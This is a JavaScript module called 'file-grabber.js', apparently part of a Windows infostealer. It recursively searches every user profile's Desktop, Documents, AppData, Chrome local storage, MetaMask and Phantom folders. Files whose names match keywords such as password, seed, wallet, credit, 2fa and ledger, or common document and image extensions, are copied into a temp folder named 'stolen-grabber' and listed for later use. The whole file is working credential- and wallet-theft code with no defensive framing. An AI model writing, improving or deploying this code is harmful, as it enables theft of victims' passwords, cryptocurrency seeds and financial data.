// file-grabber.js - Final Recommended Version
const fs = require('fs/promises');
const path = require('path');
const os = require('os');

const keywords = [
    "token","password","secret","crypto","wallet","seed","metamask","bank","phantom","code","ronin","rabby",
    "backup","account","login","credit","card","banque","mdp","number","paypal","compte","2fa","mfa","ledger","exodus",
    "atomic","database","config","auth","exodus","compte","motdepass","mot_de_pass","permis"
];

const extensions = [".txt",".webp","xls",".log",".json",".db",".csv",".pdf",".doc",".docx",".ldb",".png",".jpg",".jpeg"];

const isMatchingFile = (name) => {
    const lower = name.toLowerCase();
    return keywords.some(k => lower.includes(k)) ||
           extensions.some(e => lower.endsWith(e));
};

const saveFoundFile = async (fullPath, filename, user, folder) => {
    try {
        const tempDir = path.join(os.tmpdir(), 'stolen-grabber');
        await fs.mkdir(tempDir, { recursive: true });
        const destPath = path.join(tempDir, `${user}_${folder}_${filename}`);
        await fs.copyFile(fullPath, destPath);
        return destPath;
    } catch (e) {
        return null;
    }
};

module.exports = async () => {
    try {
        console.log("[+] File grabber started (improved)...");

        const found = [];
        const savedPaths = [];
        const usersPath = 'C:\\Users';
        const users = await fs.readdir(usersPath);

        for (const user of users) {
            const baseFolders = [
                'Desktop', 'Downloads', 'Documents', 'Pictures',
                'Videos', 'Music', 'OneDrive', 'AppData\\Roaming',
                'AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb',
                'AppData\\Roaming\\MetaMask', 'AppData\\Roaming\\Phantom'
            ];

            for (const folder of baseFolders) {
                const fullFolder = path.join(usersPath, user, folder);
                try {
                    const stat = await fs.stat(fullFolder);
                    if (stat.isDirectory()) {
                        await searchFiles(fullFolder, found, savedPaths, user, folder);
                    }
                } catch (e) {}
            }
        }

        console.log(`[+] Grabber found ${found.length} matching files`);

        return {
            count: found.length,
            files: found,
            savedPaths: savedPaths
        };

    } catch (e) {
        console.log("[-] Grabber error:", e.message);
        return { count: 0, files: [], savedPaths: [] };
    }
};

const searchFiles = async (dir, found, savedPaths, user, folder) => {
    try {
        const files = await fs.readdir(dir);
        for (const file of files) {
            const fullPath = path.join(dir, file);
            const stat = await fs.stat(fullPath);

            if (stat.isFile() && stat.size <= 10 * 1024 * 1024 && isMatchingFile(file)) {
                const savedPath = await saveFoundFile(fullPath, file, user, folder);
                found.push({
                    user, folder, filename: file, path: fullPath,
                    size: stat.size, savedAs: savedPath
                });
                if (savedPath) savedPaths.push(savedPath);
            }
            else if (stat.isDirectory() && !file.startsWith('.')) {
                await searchFiles(fullPath, found, savedPaths, user, folder);
            }
        }
    } catch (e) {}
};


